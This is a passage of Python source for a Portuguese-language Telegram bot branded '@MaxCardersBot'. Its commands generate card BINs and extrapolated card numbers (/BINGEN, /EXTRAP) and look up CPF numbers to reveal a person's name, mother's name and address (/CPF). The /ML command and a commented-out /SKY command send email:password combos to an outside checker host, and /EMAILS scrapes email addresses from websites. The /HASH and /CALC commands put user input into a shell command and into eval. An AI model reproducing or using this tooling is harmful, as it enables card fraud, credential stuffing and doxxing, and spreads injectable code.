						bot.sendMessage("@BRAZILREPORTS", f"<pre>{nome}</pre> <b>FOI REPORTADO POR</b> <pre>{quem}</pre>.\n\n<b>MOTIVO:</b> <pre>{motivo}</pre>", "html")
						bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Report enviado com sucesso!</b>", "html", reply_to_message_id = msg["message_id"])
					else:
						bot.sendMessage(msg["chat"]["id"], f"<b>Marque alguma mensagem que o usuario enviou e envie o comando para poder reportar.</b>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/EXTRAP" and msg["text"].split()[1]):
					bin = msg["text"].split()[1]
					if(len(bin) > 6):
						bin = bin[:6]
					def numGen(quantidade):
						numeros = ""
						nums = list("x0x1x2x3x4x5x6x7x8x9")
						for x in range(0, quantidade):
							numeros += str(choice(nums))
						return numeros
					keyboard = InlineKeyboardMarkup(
						inline_keyboard=[
							[InlineKeyboardButton(text=f"🔄 Atualizar", callback_data="extrap")]
						]
					)
					bot.sendMessage(msg["chat"]["id"], f"<b>EXTRAPOLAÇÕES:</b>\n\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>\n<pre>{bin}{numGen(10)}</pre>", "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
				elif(msg["text"].split()[0].upper() == "/HASH" and msg["text"].split()[1]):
					hash = msg["text"][6:]
					result_hashs = subprocess.getstatusoutput(f"python hashid.py '{hash}'")[1].replace("[+] Unknown hash", "Hash desconhecida!")
					msg_bot = bot.sendMessage(msg["chat"]["id"], f"<b>Procurando possíveis hash's, por favor aguarde...</b>", "html", reply_to_message_id = msg["message_id"])
					if(result_hashs == "Hash desconhecida!"):
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>{result_hashs}</b>", parse_mode="html")
					else:
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>POSSÍVEIS HASH's:\n\n{result_hashs.replace('[+] ', '-> ')}</b>", parse_mode="html")
				elif(msg["text"].split()[0].upper() == "/SSH" and msg["text"].split()[1] and msg["text"].split()[2]):
					try:
						msg_bot = bot.sendMessage(msg["chat"]["id"], "<b>Criando conta SSH, Aguarde..</b>", "html", reply_to_message_id = msg["message_id"])
						erro = "<b>Ocorreu um erro ao tentar criar a conta SSH. Tente enviar o comando novamente ou mudar o nome de usuario enviado.\n\n⚠️ Caso o erro continuar, tente escolher outro país.</b>\n\n<b>Nota:</b> <i>Não inclua caracteres especiais.</i>"
						pais = msg["text"].split()[1]
						usuario = msg["text"].split()[2]
						senha = msg["text"].split()[3]
						if(pais.upper() == "-F"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=France2"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>7 Dias</pre>

<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>

<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>

<b>Servidor:</b>
<pre>França</pre>

<b>Usuario:</b>
<pre>{api[2].text}</pre>

<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>

<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=erro, parse_mode="html")
						elif(pais.upper() == "-B"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=Brazil"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>1 Dia</pre>
						
<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>
						
<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>
						
<b>Servidor:</b>
<pre>Brasil</pre>
						
<b>Usuario:</b>
<pre>{api[2].text}</pre>
						
<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>
						
<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=erro, parse_mode="html")
						elif(pais.upper() == "-C"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=canada"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>5 Dias</pre>
					
<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>
					
<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>
					
<b>Servidor:</b>
<pre>Canadá</pre>

<b>Usuario:</b>
<pre>{api[2].text}</pre>
					
<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>
					
<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=err, parse_mode="html")
						elif(pais.upper() == "-U"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=usa2"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>3 Dias</pre>
					
<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>
					
<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>
					
<b>Servidor:</b>
<pre>Estados Unidos - USA</pre>
					
<b>Usuario:</b>
<pre>{api[2].text}</pre>
					
<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>
					
<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=erro, parse_mode="html")
						elif(pais.upper() == "-R"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=Russia1"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>7 Dias</pre>
						
<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>
						
<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>
						
<b>Servidor:</b>
<pre>Russia</pre>
						
<b>Usuario:</b>
<pre>{api[2].text}</pre>
						
<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>
						
<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=erro, parse_mode="html")
						
						elif(pais.upper() == "-T"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=italy"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>7 Dias</pre>
						
<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>
						
<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>
						
<b>Servidor:</b>
<pre>Itália</pre>
						
<b>Usuario:</b>
<pre>{api[2].text}</pre>
						
<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>
						
<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=erro, parse_mode="html")
						
						elif(pais.upper() == "-J"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=japan"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>3 Dias</pre>
					
<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>
					
<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>
					
<b>Servidor:</b>
<pre>Japão</pre>
					
<b>Usuario:</b>
<pre>{api[2].text}</pre>
					
<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>
					
<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=erro, parse_mode="html")
						elif(pais.upper() == "-A"):
							url = "https://www.vpnjantit.com/create-free-account.html?type=SSH&server=germany"
							data = {"user":usuario, "pass":senha}
							response = requests.post(url, data=data).text
							source = bs(response, "html.parser")
							api = source.find_all("h1")
							try:
								dados = f"""<b>Dias de atividade:</b>
<pre>7 Dias</pre>
					
<b>Host/IP:</b>
<pre>{api[6].text.split()[0]}</pre>
					
<b>Portas:</b>
<pre>22 (OpenSSH), 80, 444 (DropBear)</pre>
				
<b>Servidor:</b>
<pre>Alemanha</pre>
					
<b>Usuario:</b>
<pre>{api[2].text}</pre>
					
<b>Senha:</b>
<pre>{api[3].text.split()[0]}</pre>
					
<b>Data de expiração:</b>
<pre>{api[4].text}</pre>"""
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados, parse_mode="html")
							except:
								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=erro, parse_mode="html")
						else:
							bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>País não encontrado, para mais detalhes dê um</b> /ssh <b>para exibir os paises.</b>", parse_mode="html")
					except:
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>Sintaxe de comando incorreta. Para mais detalhes, dê um </b> /ssh <b>para exibir exemplos.</b>", parse_mode="html")
				elif(msg["text"].split()[0].upper() == "/EMAILS" and msg["text"].split()[1]):
					url = msg["text"].split()[1]
					if(url.count("https") == 0 and url.count("http") == 0):
						url = "http://"+url
					try:
						r = requests.get(url).text
						pattern = "[a-zA-Z0-9_]+@[a-zA-Z0-9_]+[.][a-zA-Z0-9_]+[a-zA-Z0-9_.]+"
						emails = re.compile(pattern).findall(r)
						if(emails == []):
							bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Nenhum email encontrado no site</b> <pre>{url}</pre>!", "html", reply_to_message_id = msg["message_id"])
						else:
							email = ""
							counter = 0
							for x in emails:
								counter += 1
								email += f"<pre>{x}</pre>\n"
							bot.sendMessage(msg["chat"]["id"], f"<b>{len(emails)} EMAIL(S) ENCONTRADO(S):</b>\n\n{email}", "html", reply_to_message_id = msg["message_id"])
					except:
						bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Site inválido ou tem muito email para ser enviado.</b>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/PASTE" and msg["text"].split()[1]):
					texto = msg["text"][7:]
					link = pastebin(texto)
					bot.sendMessage(msg["chat"]["id"], f'<b>Opa, seu texto foi enviado. Clique</b> <a href="{link}">Aqui</a> <b>Ou então aqui mesmo no link abaixo:</b>\n{link}', "html", reply_to_message_id = msg["message_id"], disable_web_page_preview=True)
				
#				elif(msg["text"].split()[0].upper() == "/SKY" and msg["text"].split()[1]):
#					contas = msg["text"][5:].replace(":", "|")
#					if(msg["text"].split()[1] == "-S"):
#						contas = requests.get(msg["text"].split()[2]).text
#					contas_l = re.compile("[a-zA-Z0-9_.]+@[a-zA-Z0-9_.]+\.[a-zA-Z0-9_.]+.|\d{3}\.?\d{3}\.?\d{3}\.?-?\d{2}").findall(contas)
#					contas = contas.split("\n")
#					count = 0
#					for conta in contas:
#						if(re.compile("[a-zA-Z0-9_.]+@[a-zA-Z0-9_.]+\.[a-zA-Z0-9_.]+.|\d{3}\.?\d{3}\.?\d{3}\.?-?\d{2}").findall(conta)):
#							proxy = "206.189.171.31:3128"
#							count += 1
#							msg_bot = bot.sendMessage(msg["chat"]["id"], f'<b>.. [{count}/{len(contas_l)}]</b>', "html", reply_to_message_id = msg["message_id"])
#							url = "http://tabuadafree.000webhostapp.com/chk__sky.php"
#							r = html.escape(requests.get(url, params={"info":conta, "p":proxy}).text)
#							if(r.count("""414 Request-URI Too Long:""")):
#								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>Não foi possivel testar os logins. Para você obter exito, dê quebras de linhas para mim poder processar.</b>", parse_mode="html")
#								break
#							keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='💣', callback_data='chkgen')]])
#							if(r.count("Teste Novamente")):
#								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>{r}\n\nPROXY: {proxy}</b>", parse_mode="html", reply_markup=keyboard)
#							else:
#								bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=f"<b>{r}</b>", parse_mode="html", reply_markup=keyboard)
				
				
				
				
				
				
				
				
				
				
				
				
				
				elif(msg["text"].split()[0].upper() == "/ML" and msg["text"].split()[1]):
					get = msg["text"].split()[1]
					if(get.upper() == "-T"):
						contas = msg["text"][4+len(get)+1:].replace(":", "|").split("\n")
						for conta in contas:
							if(conta.replace(" ", "") != ""):
								url = "http://tabuadafree.000webhostapp.com/api.php?info="+conta
								r = html.escape(requests.get(url).text)
								bot.sendMessage(msg["chat"]["id"], f"<b>{r}</b>", "html", reply_to_message_id = msg["message_id"])
					elif(get.upper() == "-S"):
						url = msg["text"].split()[2]
						if(url.count("https") == 0 and url.count("http") == 0):
							url = "http://"+url
						try:
							r = requests.get(url).text
							pattern = "[a-zA-Z0-9_]+@[a-zA-Z0-9_]+[.][a-zA-Z0-9_]+[a-zA-Z0-9_.]"
							emails = re.compile(pattern).findall(r)
							if(emails == []):
								bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Nenhum email encontrado no site</b> <pre>{url}</pre>!", "html", reply_to_message_id = msg["message_id"])
							else:
								for x in emails:
									if(x.find("@")):
										url = "http://tabuadafree.000webhostapp.com/api.php?info="+x.replace(";", "|").replace(":", "|")
										r = html.escape(requests.get(url).text)
										bot.sendMessage(msg["chat"]["id"], f"<b>{html.escape(r)}</b>", "html", reply_to_message_id = msg["message_id"])
						except Exception as err:
							print(err)
							bot.sendMessage(msg["chat"]["id"], f"<pre>{msg['from']['first_name']}</pre>, <b>Site inválido ou tem muito email para ser enviado.</b>", "html", reply_to_message_id = msg["message_id"])
					else:
						bot.sendMessage(msg["chat"]["id"], f"<b>Modo de entrada não encontrado. Para mais detalhes, dê um</b> /ml <b>para exibir os exemplos do comando e os modos de entradas.</b>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/NICKGEN" and msg["text"].split()[1]):
					nick = msg["text"][9:]
					keyboard = InlineKeyboardMarkup(
						inline_keyboard=[
							[InlineKeyboardButton(text=f"🔄 Atualizar", callback_data="update_nickgen")]
						]
					)
					nicks = f"""<b>01#</b> -> <pre>{gerarNick(nick)}</pre>
<b>02#</b> -> <pre>{gerarNick(nick)}</pre>
<b>03#</b> -> <pre>{gerarNick(nick)}</pre>
<b>04#</b> -> <pre>{gerarNick(nick)}</pre>
<b>05#</b> -> <pre>{gerarNick(nick)}</pre>
<b>06#</b> -> <pre>{gerarNick(nick)}</pre>
<b>07#</b> -> <pre>{gerarNick(nick)}</pre>
<b>08#</b> -> <pre>{gerarNick(nick)}</pre>
<b>09#</b> -> <pre>{gerarNick(nick)}</pre>
<b>10#</b> -> <pre>{gerarNick(nick)}</pre>
<b>11#</b> -> <pre>{gerarNick(nick)}</pre>
<b>12#</b> -> <pre>{gerarNick(nick)}</pre>
<b>13#</b> -> <pre>{gerarNick(nick)}</pre>
<b>14#</b> -> <pre>{gerarNick(nick)}</pre>
<b>15#</b> -> <pre>{gerarNick(nick)}</pre>"""
					bot.sendMessage(msg["chat"]["id"], f"<b>NICKS GERADOS:</b>\n\n{nicks}", "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
				elif(msg["text"].split()[0].upper() == "/BINGEN" and msg["text"].split()[1]):
					try:
						quantidade = int(msg["text"].split()[1])
						if(quantidade > 45):
							bot.sendMessage(msg["chat"]["id"], "<b>Insira uma quantidade menor. O maximo é de 45 para não ter flood.</b>", "html", reply_to_message_id = msg["message_id"])
						else:
							try:
								bins = ""
								for x in range(0, quantidade):
									def gen(q):
										nums = ""
										for c in range(0, int(q)):
											nums += str(randint(0, 9))
										return nums
									mastercard = ["51", "52", "53", "54", "55"]
									visa = ["4"]
									dinners_club = ["36", "38"]
									jcb = ["35"]
									discover = ["6011", "65"]
									amex = ["34", "37"]
									nomes = ["mastercard", "visa", "dinners_club", "jcb", "discover", "amex"]
									bandeira = choice(nomes)
									if(bandeira == "mastercard"):
										bin = f"{choice(mastercard)}{gen(4)}"
									if(bandeira == "visa"):
										bin = f"{choice(visa)}{gen(5)}"
									if(bandeira == "dinners_club"):
										bin = f"{choice(dinners_club)}{gen(4)}"
									if(bandeira == "jcb"):
										bin = f"35{gen(4)}"
									if(bandeira == "discover"):
										if(len(choice(discover)) == 4):
											bin = f"6011{gen(2)}"
										else:
											bin = f"65{gen(4)}"
									if(bandeira == "amex"):
										bin = f"{choice(amex)}{gen(4)}"
									
									bins += f"<pre>{bin}</pre> -> <b>{bandeira.upper().replace('_', ' ')}</b>\n"
								keyboard = InlineKeyboardMarkup(
									inline_keyboard=[
										[InlineKeyboardButton(text=f"🔄 Atualizar", callback_data="update_bingen")]
									]
								)
								bot.sendMessage(msg["chat"]["id"], f'<b>RESULTADO:</b>\n\n{bins}\n<b>NOTA: Consulte a bin para verifica-la e utiliza-la.</b>', "html", reply_to_message_id = msg["message_id"], reply_markup=keyboard)
							except KeyboardInterrupt:
								bot.sendMessage(msg["chat"]["id"], "<b>Tente inserir uma quantidade menor.</b>", "html", reply_to_message_id = msg["message_id"])
					except KeyboardInterrupt:
						bot.sendMessage(msg["chat"]["id"], "<b>Quantidade inválida, certifique-se de que isso seja é realmente um numero.</b>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/CPF" and msg["text"].split()[1]):
					consultando = bot.sendMessage(msg["chat"]["id"], f"""<b>Realizando consulta.. Por favor, aguarde.</b>""", parse_mode="html", reply_to_message_id = msg["message_id"])
					if(len(msg["text"].split()) > 2):
						api = megadadosCpf(msg["text"].split()[2])
						if(api["code"] == 200):
							if(msg["text"].split()[1].upper() == "-S"):
								dados = f"""<b>DADOS ENCONTRADOS:</b>
							
<b>NOME:</b>
<pre>{api["nome"]}</pre>
								
<b>NOME DA MÃE:</b>
<pre>{api["nomeMae"]}</pre>
								
<b>CPF:</b>
<pre>{api["cpf"]}</pre>
								
<b>SEXO:</b>
<pre>{api["sexo"].title()}</pre>

<b>DATA DE NASCIMENTO:</b>
<pre>{api["nascimento"]}</pre>
								
<b>IDADE:</b>
<pre>{api["idade"]}</pre>
								
<b>ENDEREÇO:</b>
<pre>{api["endereco"]}</pre>
								
<b>BAIRRO:</b>
<pre>{api["bairro"]}</pre>
								
<b>CIDADE:</b>
<pre>{api["cidade"]}</pre>

<b>CEP:</b>
<pre>{api["cep"]}</pre>
								
<b>#@MaxCardersBot</b>"""
								bot.editMessageText((msg["chat"]["id"], consultando["message_id"]), f"""<b>Consulta realizada com sucesso! -{html.escape('>')}</b> {pastebin(dados)}""", parse_mode="html")

							elif(msg["text"].split()[1].upper() == "-T"):
								dados = f"""<b>DADOS ENCONTRADOS:</b>
							
<b>NOME:</b>
<pre>{api["nome"]}</pre>
							
<b>NOME DA MÃE:</b>
<pre>{api["nomeMae"]}</pre>
							
<b>CPF:</b>
<pre>{api["cpf"]}</pre>
							
<b>SEXO:</b>
<pre>{api["sexo"].title()}</pre>
							
<b>DATA DE NASCIMENTO:</b>
<pre>{api["nascimento"]}</pre>
							
<b>IDADE:</b>
<pre>{api["idade"]}</pre>
							
<b>ENDEREÇO:</b>
<pre>{api["endereco"]}</pre>
							
<b>BAIRRO:</b>
<pre>{api["bairro"]}</pre>
							
<b>CIDADE:</b>
<pre>{api["cidade"]}</pre>

<b>CEP:</b>
<pre>{api["cep"]}</pre>
							
<b>#@MaxCardersBot</b>"""
								bot.editMessageText((msg["chat"]["id"], consultando["message_id"]), dados, parse_mode="html")
							else:
								bot.editMessageText((msg["chat"]["id"], consultando["message_id"]), f"""<b>Modo de envio não encontrado. Para mais detalhes, dê um</b> /cpf <b>para exibir os modos de envio e os exemplos do comando.</b>""", parse_mode="html")
						else:
							bot.editMessageText((msg["chat"]["id"], consultando["message_id"]), f"""<b>CPF não encontrado.</b>""", parse_mode="html")
					else:
						bot.editMessageText((msg["chat"]["id"], consultando["message_id"]), f"""<b>Modo de envio não encontrado. Para mais detalhes, dê um</b> /cpf <b>para exibir os modos de envio e os exemplos do comando.</b>""", parse_mode="html")

				elif(msg["text"].upper() == "/LINK"):
					link = f"""
<b>CHAT:</b>
  • <b>USER:</b> @MaxCarders
  • <b>LINK:</b> t.me/MaxCarders

<b>REPORTS:</b>
  • <b>USER:</b> @BRAZILREPORTS
  • <b>LINK:</b> t.me/BrazilReports"""
					msg_bot = bot.sendMessage(msg["chat"]["id"], link, "html", reply_to_message_id = msg["message_id"], disable_web_page_preview=True)

				elif(msg["text"].split()[0].upper() == "/WIKI" and msg["text"].split()[1]):
					busca_wiki = msg["text"][6:]
					url_wiki = "https://pt.wikipedia.org/w/api.php"
					params_wiki = {"action":"opensearch", "format":"json", "namespace":"0", "limit":"1", "search":busca_wiki}
					response_wiki = requests.get(url_wiki, params=params_wiki).json()
					try:
						title_wiki = response_wiki[0].upper()
						resumo_wiki = response_wiki[2][0]
						fonte_wiki = response_wiki[3][0]
						
						if(resumo_wiki.find("pode referir-se a:") > -1):
							bot.sendMessage(msg["chat"]["id"], f"<b>TENTE PESQUISAR ISSO DE OUTRA FORMA.</b>", "html", reply_to_message_id = msg["message_id"])
						elif(resumo_wiki != ""):
							dados_wiki = f"""<b>{title_wiki}</b>
<i>{resumo_wiki}</i> <a href="{fonte_wiki}">Veja mais</a>

<b>FONTE:</b> <pre>http://pt.wikipedia.org/wiki/</pre>"""
							bot.sendMessage(msg["chat"]["id"], dados_wiki, "html", reply_to_message_id = msg["message_id"], disable_web_page_preview = True)
						else:
							bot.sendMessage(msg["chat"]["id"], f"<b>{title_wiki} NÃO FOI ENCONTRADO!</b>", "html", reply_to_message_id = msg["message_id"])
					except:
						bot.sendMessage(msg["chat"]["id"], f"<b>{title_wiki} NÃO FOI ENCONTRADO!</b>", "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/CALC" and msg["text"].split()[1]):
					expr = msg["text"][6:]
					def calc(expr):
						if(len(expr) != 1):
							new_expr = expr.upper().replace("X", "*").replace("×","*").replace("÷","/").replace("^", "**")
							if(new_expr.count("**") == 0 or len(new_expr) >> 400):
								try:
									bot.sendMessage(msg["chat"]["id"], f'<b>➡️ O RESULTADO DO CÁLCULO DE:</b>\n<pre>{expr}</pre>\n\n<b>❇️ É IGUAL A:</b> <pre>{int(eval(new_expr))}</pre>', "html", reply_to_message_id = msg["message_id"])
								except ZeroDivisionError:
									bot.sendMessage(msg["chat"]["id"], f'<b>UÉ, VOCÊ NÃO SABIA QUE É IMPOSSIVEL DIVIDIR ALGO POR ZERO? 😕</b>', "html", reply_to_message_id = msg["message_id"])
								except:
									bot.sendMessage(msg["chat"]["id"], f'<b>CÁLCULO INVÁLIDO!</b>', "html", reply_to_message_id = msg["message_id"])
							else:
								bot.sendMessage(msg["chat"]["id"], f'<b>TA MALUCO RAPAZ? USAR ISSO AÍ É PERIGOSO DEMAIS PRA MIM ☕️🌝</b>', "html", reply_to_message_id = msg["message_id"])
						else:
							bot.sendMessage(msg["chat"]["id"], f'<b>CÁLCULO INVÁLIDO!</b>', "html", reply_to_message_id = msg["message_id"])
					calc(expr)
						
						
						
					
				elif(msg["text"].upper() == "/CHKCPF"):
					bot.sendMessage(msg["chat"]["id"], help_chkcpf, "html", reply_to_message_id = msg["message_id"])			
				elif(msg["text"].upper() == "/CPFGEN"):
					bot.sendMessage(msg["chat"]["id"], help_cpfgen, "html", reply_to_message_id = msg["message_id"])
				elif(msg["text"].split()[0].upper() == "/FIXAR"):
					bot.pinChatMessage(msg["chat"]["id"], msg["reply_to_message"]["message_id"])
				
				
				
				
				
				
				
				
				elif(msg["text"].split()[0].upper() == "/SERIE" and msg["text"].split()[1]):
					msg_bot = bot.sendMessage(msg["chat"]["id"], "<b>Procurando série, por favor aguarde..</b>", "html", reply_to_message_id = msg["message_id"])
					busca_serie = msg["text"][8:]
					url_serie = "http://www.fbseries.com/index.php"
					params_serie = {"s":busca_serie, "tipo":"video"}
					r_busca_serie = requests.get(url_serie, params=params_serie).text
					source_busca_serie = bs(r_busca_serie, "html.parser")
					first_serie = source_busca_serie.find_all("div", {"class":"capa"})
					second_serie = []
					for text in first_serie:
						second_serie.append(text.text)
					second_serie.sort()
					
					
					try:
						keyboard_series = InlineKeyboardMarkup(
							inline_keyboard=[
							]
						)
						for x in second_serie:
							keyboard[0].append([InlineKeyboardButton(text=f'{" ".join(map(str, x.split()))}', callback_data=f'{"".join(map(str, x.split()))}')])
						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text="<b>Busca Realizada Com Sucesso!\n\nEscolha abaixo uma das pesquisas:</b>", parse_mode="html", reply_markup=keyboard_series)
					except SyntaxError:
						pass
						#link_serie = first_serie.a["href"]
						#r_serie = requests.get(link_serie).text
						#source_serie = bs(r_serie, "html.parser")
						#tempo_serie = source_serie.find("span", {"class":"tempo-video"}).text
						#lancamento_serie = source_serie.find("span", {"class":"lancamento-video"}).text
						#nome_serie = source_serie.find("span", {"class":"last-bread"}).text
						#try:
						#	emissora_serie = source_serie.find("span", {"class":"emissora-video"}).text
						#except:
						#	emissora_serie = ""
						#audio_serie = source_serie.find("span", {"class":"audio-video"}).text
						#sinopse_serie = source_serie.find_all("p")[1].text
						#c_temp_serie = len(source_serie.find("ul", {"class":"tabs"}).find_all("li"))
						#if(emissora_serie == ""):
						#	dados_serie = f"""<b>💭 NOME DA SÉRIE:</b>
#<pre>{nome_serie}</pre>
							
#<b>⏰ Tempo dos episódios</b>
#<pre>{tempo_serie.split()[1]}</pre>
							
#<b>🗓 Lançado em:</b>
#<pre>{lancamento_serie.split()[1]}</pre>
							
#<b>❇️ Emissora:</b>
#<pre>Nenhuma</pre>
							
#<b>🔉 {audio_serie.split()[0]}</b>
#<pre>{" ".join(map(str, audio_serie.split()[1:]))}</pre>
						
#<b>✳️ TOTAL DE TEMPORADAS:</b>
#<pre>{c_temp_serie}</pre>

#<b>Sinopse:</b>
#<pre>{sinopse_serie}</pre>

#<b>ASSISTA A SÉRIE CLICANDO</b> <a href="{link_serie}">AQUI</a>"""
#						else:	
#							dados_serie = f"""<b>💭 NOME DA SÉRIE:</b>
#<pre>{nome_serie}</pre>
							
#<b>⏰ {tempo_serie.split()[0]}</b>
#<pre>{tempo_serie.split()[1]}</pre>
						
#<b>🗓 {lancamento_serie.split()[0]}</b>
#<pre>{lancamento_serie.split()[1]}</pre>

#<b>❇️ {emissora_serie.split()[0]}</b>
#<pre>{" ".join(map(str, emissora_serie.split()[1::]))}</pre>

#<b>🔉 {audio_serie.split()[0]}</b>
#<pre>{" ".join(map(str, audio_serie.split()[1:]))}</pre>

#<b>✳️ Total de temporadas:</b>
#<pre>{c_temp_serie}</pre>

#<b>Sinopse:</b>
#<pre>{sinopse_serie}</pre>

#<b>ASSISTA A SÉRIE CLICANDO</b> <a href="{link_serie}">AQUI</a>"""
#						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text=dados_serie, parse_mode="html", disable_web_page_preview = True)
#					except:
#						bot.editMessageText((msg["chat"]["id"], msg_bot["message_id"]), text="<b>Série não encontrada!</b>", parse_mode="html")
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				
				elif(msg["text"].split()[0].upper() == "/ANIME" and msg["text"].split()[1]):
					msg_bot = bot.sendMessage(msg["chat"]["id"], "<b>Procurando anime, por favor aguarde..</b>", "html", reply_to_message_id = msg["message_id"])
					busca_anime = msg["text"][8:]
					url_anime = "http://www.branimes.com/index.php"
					params_anime = {"s":busca_anime, "tipo":"video"}
					r_anime = requests.get(url_anime, params=params_anime).text
					source_anime = bs(r_anime, "html.parser")
					first_anime = source_anime.find("div", {"class":"capa"})
				
					try:
						link_anime = first_anime.a["href"]
						r_anime = requests.get(link_anime).text
						source_anime = bs(r_anime, "html.parser")
						try:
							tempo_anime = source_anime.find("span", {"class":"tempo-video"}).text.split()[1]
						except:
							tempo_anime = "NÃO ENCONTRADO"
							
						lancamento_anime = source_anime.find("span", {"class":"lancamento-video"}).text
						nome_anime = source_anime.find("span", {"class":"last-bread"}).text
						try:
							emissora_anime = " ".join(map(str, source_anime.find("span", {"class":"emissora-video"}).text.split()[1:]))
						except:
